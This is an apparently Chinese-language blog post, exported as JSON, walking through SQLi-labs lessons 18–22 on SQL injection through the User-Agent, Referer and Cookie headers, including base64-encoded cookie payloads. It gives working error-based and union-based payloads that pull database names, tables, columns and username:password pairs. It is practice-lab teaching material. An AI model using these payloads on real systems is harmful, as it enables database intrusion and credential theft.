{"title":"POST注入-HTTP头注入","uid":"8d3782033a7b54632cfb455b67ca9836","slug":"POST注入-HTTP头注入","date":"2022-02-05T13:27:35.000Z","updated":"2022-02-13T15:31:36.278Z","comments":true,"path":"api/articles/POST注入-HTTP头注入.json","keywords":null,"cover":[],"content":"<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"\\assets\\css\\APlayer.min.css\"><script src=\"\\assets\\js\\APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script><script class=\"meting-secondary-script-marker\" src=\"\\assets\\js\\Meting.min.js\"></script><p>[TOC]</p>\n<h2 id=\"0x00\"><a href=\"#0x00\" class=\"headerlink\" title=\"0x00\"></a>0x00</h2><h5 id=\"原理：\"><a href=\"#原理：\" class=\"headerlink\" title=\"原理：\"></a>原理：</h5><p>HTTP头中的参数带入到数据库被执行，造成了HTTP头注入。</p>\n<h3 id=\"SERVER详解\"><a href=\"#SERVER详解\" class=\"headerlink\" title=\"$_SERVER详解\"></a>$_SERVER详解</h3><pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token variable\">$_SERVER</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'SCRIPT_NAME'</span><span class=\"token punctuation\">]</span>          <span class=\"token comment\">//当前脚本的路径</span>\n<span class=\"token function\">dirname</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_SERVER</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'SCRIPT_NAME'</span><span class=\"token punctuation\">]</span>  <span class=\"token comment\">//dirname() 返回路径中的目录部分</span>\n<span class=\"token variable\">$_SERVER</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'SCRIPT_FILENAME'</span><span class=\"token punctuation\">]</span>      <span class=\"token comment\">//当前脚本执行的绝对路径</span>\n<span class=\"token variable\">$_SERVER</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'HTTP_HOST'</span><span class=\"token punctuation\">]</span>            <span class=\"token comment\">//获取当前域名</span>\n<span class=\"token variable\">$_SERVER</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'SERVER_NAME'</span><span class=\"token punctuation\">]</span>          <span class=\"token comment\">//输出配置文件httpd.conf中的ServerName，一般情况下与HTTP_HOST值相同</span>\n<span class=\"token variable\">$_SERVER</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'SystemRoot'</span><span class=\"token punctuation\">]</span>           <span class=\"token comment\">//当前服务器的操作系统的目录</span>\n<span class=\"token variable\">$_SERVER</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'SERVER_SOFTWARE'</span><span class=\"token punctuation\">]</span>      <span class=\"token comment\">//服务器软件配置信息</span>\n<span class=\"token variable\">$_SERVER</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'SERVER_PORT'</span><span class=\"token punctuation\">]</span>          <span class=\"token comment\">//服务器端口</span>\n<span class=\"token variable\">$_SERVER</span> <span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'REMOTE_PORT'</span><span class=\"token punctuation\">]</span>         <span class=\"token comment\">//用户连接到服务器时所使用的端口</span>\n<span class=\"token variable\">$_SERVER</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'SERVER_ADDR'</span><span class=\"token punctuation\">]</span>          <span class=\"token comment\">//服务器的ip地址</span>\n<span class=\"token variable\">$_SERVER</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'REMOTE_ADDR'</span><span class=\"token punctuation\">]</span>          <span class=\"token comment\">//浏览网页的用户ip。</span>\n<span class=\"token variable\">$_SERVER</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'DOCUMENT_ROOT'</span><span class=\"token punctuation\">]</span>        <span class=\"token comment\">//当前运行脚本所在的根目录</span>\n<span class=\"token variable\">$_SERVER</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'REQUEST_SCHEME'</span><span class=\"token punctuation\">]</span>       <span class=\"token comment\">//服务器通信协议，是http或https。</span>\n<span class=\"token variable\">$_SERVER</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'SERVER_ADMIN'</span><span class=\"token punctuation\">]</span>         <span class=\"token comment\">//服务器管理员信息</span>\n<span class=\"token variable\">$_SERVER</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'REQUEST_METHOD'</span><span class=\"token punctuation\">]</span>       <span class=\"token comment\">//请求数据的方式</span>\n<span class=\"token variable\">$_SERVER</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'REQUEST_URI'</span><span class=\"token punctuation\">]</span>          <span class=\"token comment\">//当前脚本路径，根目录之后的目录</span>\n<span class=\"token variable\">$_SERVER</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'PHP_SELF'</span><span class=\"token punctuation\">]</span>             <span class=\"token comment\">//当前正在执行脚本的文件名</span>\n<span class=\"token variable\">$_SERVER</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'REQUEST_TIME'</span><span class=\"token punctuation\">]</span>         <span class=\"token comment\">//得到请求开始时的时间戳。</span>\n<span class=\"token variable\">$_SERVER</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'HTTP_COOKIE'</span><span class=\"token punctuation\">]</span>          <span class=\"token comment\">//获取浏览器的cookie信息。</span>\n<span class=\"token variable\">$_SERVER</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'HTTP_CONNECTION'</span><span class=\"token punctuation\">]</span>      <span class=\"token comment\">//当前请求的连接情况</span>\n<span class=\"token variable\">$_SERVER</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'HTTP_USER_AGENT'</span><span class=\"token punctuation\">]</span>      <span class=\"token comment\">//获取用户相关信息，包括用户浏览器、操作系统等信息</span>\n<span class=\"token variable\">$_SERVER</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'HTTP_ACCEPT'</span><span class=\"token punctuation\">]</span>          <span class=\"token comment\">//当前请求的ACCEPT头部信息</span>\n<span class=\"token variable\">$_SERVER</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'HTTP_ACCEPT_LANGUAGE'</span><span class=\"token punctuation\">]</span> <span class=\"token comment\">//返回用户默认的语言设置，后面的q值表示用户对该语言的喜好程度</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n\n\n<h2 id=\"0x01（useragent注入）\"><a href=\"#0x01（useragent注入）\" class=\"headerlink\" title=\"0x01（useragent注入）\"></a>0x01（useragent注入）</h2><p><strong>Less-18</strong></p>\n<p>查看源码可知有以下注意点：</p>\n<p><img src=\"/post/POST%E6%B3%A8%E5%85%A5-HTTP%E5%A4%B4%E6%B3%A8%E5%85%A5.htm/image-20220205214039033.png\" alt=\"image-20220205214039033\"></p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token variable\">$_SERVER</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'HTTP_USER_AGENT'</span><span class=\"token punctuation\">]</span>      <span class=\"token comment\">//获取用户相关信息，包括用户浏览器、操作系统等信息</span>\n<span class=\"token variable\">$_SERVER</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'REMOTE_ADDR'</span><span class=\"token punctuation\">]</span>          <span class=\"token comment\">//浏览网页的用户ip。</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n\n<p>由于对uname和passwd进行了check_input()函数处理，导致在这两个字段上注入时不行的：</p>\n<p><img src=\"/post/POST%E6%B3%A8%E5%85%A5-HTTP%E5%A4%B4%E6%B3%A8%E5%85%A5.htm/image-20220205214350305.png\" alt=\"image-20220205214350305\"></p>\n<p>但在源码中有了Insert字段，可以从这里入手。</p>\n<p><img src=\"/post/POST%E6%B3%A8%E5%85%A5-HTTP%E5%A4%B4%E6%B3%A8%E5%85%A5.htm/image-20220205220615022.png\" alt=\"image-20220205220615022\"></p>\n<p><img src=\"/post/POST%E6%B3%A8%E5%85%A5-HTTP%E5%A4%B4%E6%B3%A8%E5%85%A5.htm/image-20220205220601734.png\" alt=\"image-20220205220601734\"></p>\n<h2 id=\"0x02\"><a href=\"#0x02\" class=\"headerlink\" title=\"0x02\"></a>0x02</h2><p>先尝试<code>admin</code>和<code>admin</code>登录，页面返回<code>User Agent</code>信息，由此在HTTP头里进行<code>User Agent</code>字段注入</p>\n<p><img src=\"/post/POST%E6%B3%A8%E5%85%A5-HTTP%E5%A4%B4%E6%B3%A8%E5%85%A5.htm/image-20220205222503023.png\" alt=\"image-20220205222503023\"></p>\n<h2 id=\"0x03\"><a href=\"#0x03\" class=\"headerlink\" title=\"0x03\"></a>0x03</h2><p>抓包改包：</p>\n<p>抓包后将<code>User Agent</code>随便添加了几个字符，页面也同样返回了几个字符：</p>\n<p><img src=\"/post/POST%E6%B3%A8%E5%85%A5-HTTP%E5%A4%B4%E6%B3%A8%E5%85%A5.htm/image-20220205222953053.png\" alt=\"image-20220205222953053\"></p>\n<p><img src=\"/post/POST%E6%B3%A8%E5%85%A5-HTTP%E5%A4%B4%E6%B3%A8%E5%85%A5.htm/image-20220205223005987.png\" alt=\"image-20220205223005987\"></p>\n<p><img src=\"/post/POST%E6%B3%A8%E5%85%A5-HTTP%E5%A4%B4%E6%B3%A8%E5%85%A5.htm/image-20220205223022658.png\" alt=\"image-20220205223022658\"></p>\n<h2 id=\"0x04\"><a href=\"#0x04\" class=\"headerlink\" title=\"0x04\"></a>0x04</h2><p>爆库：</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">User-Agent: &#39;and extractvalue(1,concat(0x7e,(select database()),0x7e)) and &#39;1&#39;&#x3D;&#39;1<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p><img src=\"/post/POST%E6%B3%A8%E5%85%A5-HTTP%E5%A4%B4%E6%B3%A8%E5%85%A5.htm/image-20220205223434243.png\" alt=\"image-20220205223434243\"></p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">$insert&#x3D;&quot;INSERT INTO &#96;security&#96;.&#96;uagents&#96; (&#96;uagent&#96;, &#96;ip_address&#96;, &#96;username&#96;) VALUES (&#39;$uagent&#39;, &#39;$IP&#39;, $uname)&quot;;<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p><code>and</code>前的<code>&#39;</code>是将<code>&#39;$uagent&#39;</code>中的前<code>&#39;</code>进行闭合，使用<code>or &#39;1&#39;=&#39;1</code>将<code>&#39;$uagent&#39;</code>后面的<code>&#39;</code>闭合；</p>\n<p><img src=\"/post/POST%E6%B3%A8%E5%85%A5-HTTP%E5%A4%B4%E6%B3%A8%E5%85%A5.htm/image-20220205225102107.png\" alt=\"image-20220205225102107\"></p>\n<p><img src=\"/post/POST%E6%B3%A8%E5%85%A5-HTTP%E5%A4%B4%E6%B3%A8%E5%85%A5.htm/image-20220205225118423.png\" alt=\"image-20220205225118423\"></p>\n<h2 id=\"0x05\"><a href=\"#0x05\" class=\"headerlink\" title=\"0x05\"></a>0x05</h2><p>爆版本号：</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">&#39;and extractvalue(1,concat(0x7e,(select version()),0x7e)) and &#39;1&#39;&#x3D;&#39;1<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p><img src=\"/post/POST%E6%B3%A8%E5%85%A5-HTTP%E5%A4%B4%E6%B3%A8%E5%85%A5.htm/image-20220205225349977.png\" alt=\"image-20220205225349977\"></p>\n<h2 id=\"0x06\"><a href=\"#0x06\" class=\"headerlink\" title=\"0x06\"></a>0x06</h2><p>在爆表名的时候由于一个地方不知道什么原因试了很久，记录一下：</p>\n<p>这里一开始注入的是以下语句：</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">User-Agent: &#39;and extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()),0x7e)) and &#39;1&#39;&#x3D;&#39;1<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>页面没有爆出表；</p>\n<p><img src=\"/post/POST%E6%B3%A8%E5%85%A5-HTTP%E5%A4%B4%E6%B3%A8%E5%85%A5.htm/image-20220205234603717.png\" alt=\"image-20220205234603717\"></p>\n<p><img src=\"/post/POST%E6%B3%A8%E5%85%A5-HTTP%E5%A4%B4%E6%B3%A8%E5%85%A5.htm/image-20220205234615471.png\" alt=\"image-20220205234615471\"></p>\n<p>当把<code>and</code>改成<code>or</code>才爆出表名：</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">User-Agent: &#39;or extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()),0x7e)) and &#39;1&#39;&#x3D;&#39;1<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p><img src=\"/post/POST%E6%B3%A8%E5%85%A5-HTTP%E5%A4%B4%E6%B3%A8%E5%85%A5.htm/image-20220205234819705.png\" alt=\"image-20220205234819705\"></p>\n<p><img src=\"/post/POST%E6%B3%A8%E5%85%A5-HTTP%E5%A4%B4%E6%B3%A8%E5%85%A5.htm/image-20220205234826888.png\" alt=\"image-20220205234826888\"></p>\n<p>这里进行了一个实验，应该是出现上述情况的原因：</p>\n<p>注入语句用<code>and</code>连接的话，单引号闭合之后形成的是<code>&#39;&#39;</code>代表空值，而后面的<code>extractvalue()</code>查询到结果为真，也就是1，在mysql中实验如图：</p>\n<p><img src=\"/post/POST%E6%B3%A8%E5%85%A5-HTTP%E5%A4%B4%E6%B3%A8%E5%85%A5.htm/image-20220205235435928.png\" alt=\"image-20220205235435928\"></p>\n<p>空值和1<code>and</code>完之后为0，可能导致数据库不返回报错信息，导致没有爆出表名。</p>\n<h2 id=\"0x07\"><a href=\"#0x07\" class=\"headerlink\" title=\"0x07\"></a>0x07</h2><p>爆字段：</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">User-Agent: &#39;or extractvalue(1,concat(0x7e,(select (column_name) from information_schema.columns where table_name&#x3D;&#39;users&#39; limit 4,1),0x7e)) and &#39;1&#39;&#x3D;&#39;1<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p><img src=\"/post/POST%E6%B3%A8%E5%85%A5-HTTP%E5%A4%B4%E6%B3%A8%E5%85%A5.htm/image-20220206000302280.png\" alt=\"image-20220206000302280\"></p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">User-Agent: &#39;or extractvalue(1,concat(0x7e,(select (column_name) from information_schema.columns where table_name&#x3D;&#39;users&#39; limit 5,1),0x7e)) and &#39;1&#39;&#x3D;&#39;1<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p><img src=\"/post/POST%E6%B3%A8%E5%85%A5-HTTP%E5%A4%B4%E6%B3%A8%E5%85%A5.htm/image-20220206000402501.png\" alt=\"image-20220206000402501\"></p>\n<h2 id=\"0x08\"><a href=\"#0x08\" class=\"headerlink\" title=\"0x08\"></a>0x08</h2><p>爆内容：</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">User-Agent: &#39;or extractvalue(1,concat(0x7e,(select concat(username,&#39;:&#39;,password) from users limit 0,1),0x7e)) and &#39;1&#39;&#x3D;&#39;1<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p><img src=\"/post/POST%E6%B3%A8%E5%85%A5-HTTP%E5%A4%B4%E6%B3%A8%E5%85%A5.htm/image-20220206000602759.png\" alt=\"image-20220206000602759\"></p>\n<hr>\n<h2 id=\"0x01（referer注入）\"><a href=\"#0x01（referer注入）\" class=\"headerlink\" title=\"0x01（referer注入）\"></a>0x01（referer注入）</h2><p><strong>Less-19</strong></p>\n<p><em>HTTP Referer是<a href=\"https://baike.baidu.com/item/header/688992\">header</a>的一部分，当<a href=\"https://baike.baidu.com/item/%E6%B5%8F%E8%A7%88%E5%99%A8/213911\">浏览器</a>向web<a href=\"https://baike.baidu.com/item/%E6%9C%8D%E5%8A%A1%E5%99%A8\">服务器</a>发送请求的时候，一般会带上Referer，告诉服务器该网页是从哪个页面链接过来的，服务器因此可以获得一些信息用于处理。</em></p>\n<p>首先输入<code>admin</code>和<code>admin</code>页面返回Referer信息，据此可知19关的思路应该是 Referer注入。</p>\n<p><img src=\"/post/POST%E6%B3%A8%E5%85%A5-HTTP%E5%A4%B4%E6%B3%A8%E5%85%A5.htm/image-20220206223214033.png\" alt=\"image-20220206223214033\"></p>\n<h2 id=\"0x02-1\"><a href=\"#0x02-1\" class=\"headerlink\" title=\"0x02\"></a>0x02</h2><p>抓包后随便修改Referer值页面返回同样是修改后的内容：</p>\n<p><img src=\"/post/POST%E6%B3%A8%E5%85%A5-HTTP%E5%A4%B4%E6%B3%A8%E5%85%A5.htm/image-20220206223703891.png\" alt=\"image-20220206223703891\"></p>\n<h2 id=\"0x03-1\"><a href=\"#0x03-1\" class=\"headerlink\" title=\"0x03\"></a>0x03</h2><p>爆库名：</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">Referer: &#39; or extractvalue(1,concat(0x7e,(select database()),0x7e)) and &#39;1&#39; &#x3D;&#39;1<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p><img src=\"/post/POST%E6%B3%A8%E5%85%A5-HTTP%E5%A4%B4%E6%B3%A8%E5%85%A5.htm/image-20220206224350236.png\" alt=\"image-20220206224350236\"></p>\n<p>爆表名：</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">Referer: &#39; or extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database() limit 0,1),0x7e)) and &#39;1&#39; &#x3D;&#39;1<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>爆字段：</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">Referer: &#39; or extractvalue(1,concat(0x7e,(select (column_name) from information_schema.columns where table_name&#x3D;&#39;users&#39; limit 4,1),0x7e)) and &#39;1&#39; &#x3D;&#39;1<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">Referer: &#39; or extractvalue(1,concat(0x7e,(select (column_name) from information_schema.columns where table_name&#x3D;&#39;users&#39; limit 5,1),0x7e)) and &#39;1&#39; &#x3D;&#39;1<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>爆内容：</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">Referer: &#39; or extractvalue(1,concat(0x7e,(select concat(username,&#39;:&#39;,password) from users limit 0,1),0x7e)) and &#39;1&#39; &#x3D;&#39;1<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<hr>\n<h2 id=\"0x01（Cookie注入）\"><a href=\"#0x01（Cookie注入）\" class=\"headerlink\" title=\"0x01（Cookie注入）\"></a>0x01（Cookie注入）</h2><p><strong>Less-20</strong></p>\n<p>从源码分析如下：</p>\n<p><img src=\"/post/POST%E6%B3%A8%E5%85%A5-HTTP%E5%A4%B4%E6%B3%A8%E5%85%A5.htm/image-20220206230125585.png\" alt=\"image-20220206230125585\"></p>\n<p><img src=\"/post/POST%E6%B3%A8%E5%85%A5-HTTP%E5%A4%B4%E6%B3%A8%E5%85%A5.htm/image-20220206230141836.png\" alt=\"image-20220206230141836\"></p>\n<p> <code>$_COOKIE</code>接收到<code>username</code>的值后将会带入数据库查询，从这可以进行注入。</p>\n<h2 id=\"0x02-2\"><a href=\"#0x02-2\" class=\"headerlink\" title=\"0x02\"></a>0x02</h2><p>首先进行正常输入<code>admin</code>和<code>admin</code>看一下回显页面：</p>\n<p>根据以上分析在<code>cookie</code>进行报错注入。</p>\n<p><img src=\"/post/POST%E6%B3%A8%E5%85%A5-HTTP%E5%A4%B4%E6%B3%A8%E5%85%A5.htm/image-20220206232324785.png\" alt=\"image-20220206232324785\"></p>\n<h2 id=\"0x03-2\"><a href=\"#0x03-2\" class=\"headerlink\" title=\"0x03\"></a>0x03</h2><p>记录一下踩得坑：</p>\n<p>这里抓包之后添加<code>Cookie：uname=admin</code>后使用POST方式提交的话返回异常回显：<img src=\"/post/POST%E6%B3%A8%E5%85%A5-HTTP%E5%A4%B4%E6%B3%A8%E5%85%A5.htm/image-20220206231743882.png\" alt=\"image-20220206231743882\"></p>\n<p>该成GET方式提交回显正常：</p>\n<p><img src=\"/post/POST%E6%B3%A8%E5%85%A5-HTTP%E5%A4%B4%E6%B3%A8%E5%85%A5.htm/image-20220206232500745.png\" alt=\"image-20220206232500745\"></p>\n<p>爆库名：</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">Cookie: uname&#x3D;admin&#39; or extractvalue(1,concat(0x7e,(select database()),0x7e))#<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p><img src=\"/post/POST%E6%B3%A8%E5%85%A5-HTTP%E5%A4%B4%E6%B3%A8%E5%85%A5.htm/image-20220206232706475.png\" alt=\"image-20220206232706475\"></p>\n<p>后续过程与Less-19相同，同样也可以使用其他注入。</p>\n<hr>\n<p>##0x01（Cookie注入-base64）</p>\n<p>从源码分析得知，与Less-20不同的是，Less-21对<code>uname</code>字段进行了base64加密：</p>\n<p><img src=\"/post/POST%E6%B3%A8%E5%85%A5-HTTP%E5%A4%B4%E6%B3%A8%E5%85%A5.htm/image-20220206233854877.png\" alt=\"image-20220206233854877\"></p>\n<p><img src=\"/post/POST%E6%B3%A8%E5%85%A5-HTTP%E5%A4%B4%E6%B3%A8%E5%85%A5.htm/image-20220206233952173.png\" alt=\"image-20220206233952173\"></p>\n<p><img src=\"/post/POST%E6%B3%A8%E5%85%A5-HTTP%E5%A4%B4%E6%B3%A8%E5%85%A5.htm/image-20220206235141632.png\" alt=\"image-20220206235141632\"></p>\n<p>这里其实是：<code>$_COOKIE</code>获取到<code>uname</code>字段的内容后先进行了<strong>base64_encode</strong>，提交表单之后又进行了<strong>base64_decode</strong>，最后将解密后的<code>cookie</code>代入数据库查询，最后又进行了<strong>base64_encode</strong>。由此可知，在注入的时候要先要进行一次<strong>base64_encode</strong>，思路大概就是这样。</p>\n<p><strong>这里还需注意一个点：此处的cookie值进行了<code>&#39;)</code>处理，导致开始注入的时候老是报语法错误。</strong></p>\n<h2 id=\"0x02-3\"><a href=\"#0x02-3\" class=\"headerlink\" title=\"0x02\"></a>0x02</h2><p>先抓包，然后进行<code>cookie</code>加密注入：</p>\n<p>探测一下字段数，有3个字段：</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">Cookie: uname&#x3D;YWRtaW4nKSBvcmRlciBieSA0Iw&#x3D;&#x3D;<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p><img src=\"/post/POST%E6%B3%A8%E5%85%A5-HTTP%E5%A4%B4%E6%B3%A8%E5%85%A5.htm/image-20220207001749683.png\" alt=\"image-20220207001749683\"></p>\n<p>联合注入爆库，爆版本号：</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">Cookie: uname&#x3D;LWFkbWluJykgdW5pb24gc2VsZWN0IDEsZGF0YWJhc2UoKSx2ZXJzaW9uKCkj<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p><img src=\"/post/POST%E6%B3%A8%E5%85%A5-HTTP%E5%A4%B4%E6%B3%A8%E5%85%A5.htm/image-20220207002221359.png\" alt=\"image-20220207002221359\"></p>\n<p>爆表名：</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">Cookie: uname&#x3D;LWFkbWluJykgdW5pb24gc2VsZWN0IDEsMixncm91cF9jb25jYXQodGFibGVfbmFtZSkgZnJvbSBpbmZvcm1hdGlvbl9zY2hlbWEudGFibGVzIHdoZXJlIHRhYmxlX3NjaGVtYT1kYXRhYmFzZSgpIw&#x3D;&#x3D;<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p><img src=\"/post/POST%E6%B3%A8%E5%85%A5-HTTP%E5%A4%B4%E6%B3%A8%E5%85%A5.htm/image-20220207002533567.png\" alt=\"image-20220207002533567\"></p>\n<p>爆字段：</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">Cookie: uname&#x3D;LWFkbWluJykgdW5pb24gc2VsZWN0IDEsMixncm91cF9jb25jYXQoY29sdW1uX25hbWUpIGZyb20gaW5mb3JtYXRpb25fc2NoZW1hLmNvbHVtbnMgd2hlcmUgdGFibGVfbmFtZT0ndXNlcnMnIw&#x3D;&#x3D;<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p><img src=\"/post/POST%E6%B3%A8%E5%85%A5-HTTP%E5%A4%B4%E6%B3%A8%E5%85%A5.htm/image-20220207003331834.png\" alt=\"image-20220207003331834\"></p>\n<p>爆内容：</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">uname&#x3D;LWFkbWluJykgdW5pb24gc2VsZWN0IDEsZ3JvdXBfY29uY2F0KHVzZXJuYW1lKSxncm91cF9jb25jYXQocGFzc3dvcmQpIGZyb20gc2VjdXJpdHkudXNlcnMj<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p><img src=\"/post/POST%E6%B3%A8%E5%85%A5-HTTP%E5%A4%B4%E6%B3%A8%E5%85%A5.htm/image-20220207002804799.png\" alt=\"image-20220207002804799\"></p>\n<p>Less-21最关键的就在于<strong>base64</strong>加解密的注入。</p>\n<h2 id=\"0x01（Cookie注入）-1\"><a href=\"#0x01（Cookie注入）-1\" class=\"headerlink\" title=\"0x01（Cookie注入）\"></a>0x01（Cookie注入）</h2><p><strong>Less-22</strong></p>\n<p>这里只有编码注入的时候注意<code>&quot;</code>就OK：</p>\n<p><img src=\"/post/POST%E6%B3%A8%E5%85%A5-HTTP%E5%A4%B4%E6%B3%A8%E5%85%A5.htm/image-20220207003837052.png\" alt=\"image-20220207003837052\"></p>\n<p>其他payload与Less-21相同。</p>\n","text":"[TOC] 0x00原理：HTTP头中的参数带入到数据库被执行，造成了HTTP头注入。 $_SERVER详解$_SERVER['SCRIPT_NAME'] //当前脚本的路径 dirname($_SERVER['SCRIPT_NAME'] //dirname() 返回路径中的目录...","link":"","photos":[],"count_time":{"symbolsCount":"5.7k","symbolsTime":"5 mins."},"categories":[{"name":"SQL注入","slug":"SQL注入","count":20,"path":"api/categories/SQL注入.json"}],"tags":[{"name":"SQL注入","slug":"SQL注入","count":21,"path":"api/tags/SQL注入.json"}],"toc":"<ol class=\"toc\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#0x00\"><span class=\"toc-text\">0x00</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#%E5%8E%9F%E7%90%86%EF%BC%9A\"><span class=\"toc-text\">原理：</span></a></li></ol></li></ol></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#SERVER%E8%AF%A6%E8%A7%A3\"><span class=\"toc-text\">$_SERVER详解</span></a></li></ol></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#0x01%EF%BC%88useragent%E6%B3%A8%E5%85%A5%EF%BC%89\"><span class=\"toc-text\">0x01（useragent注入）</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#0x02\"><span class=\"toc-text\">0x02</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#0x03\"><span class=\"toc-text\">0x03</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#0x04\"><span class=\"toc-text\">0x04</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#0x05\"><span class=\"toc-text\">0x05</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#0x06\"><span class=\"toc-text\">0x06</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#0x07\"><span class=\"toc-text\">0x07</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#0x08\"><span class=\"toc-text\">0x08</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#0x01%EF%BC%88referer%E6%B3%A8%E5%85%A5%EF%BC%89\"><span class=\"toc-text\">0x01（referer注入）</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#0x02-1\"><span class=\"toc-text\">0x02</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#0x03-1\"><span class=\"toc-text\">0x03</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#0x01%EF%BC%88Cookie%E6%B3%A8%E5%85%A5%EF%BC%89\"><span class=\"toc-text\">0x01（Cookie注入）</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#0x02-2\"><span class=\"toc-text\">0x02</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#0x03-2\"><span class=\"toc-text\">0x03</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#0x02-3\"><span class=\"toc-text\">0x02</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" 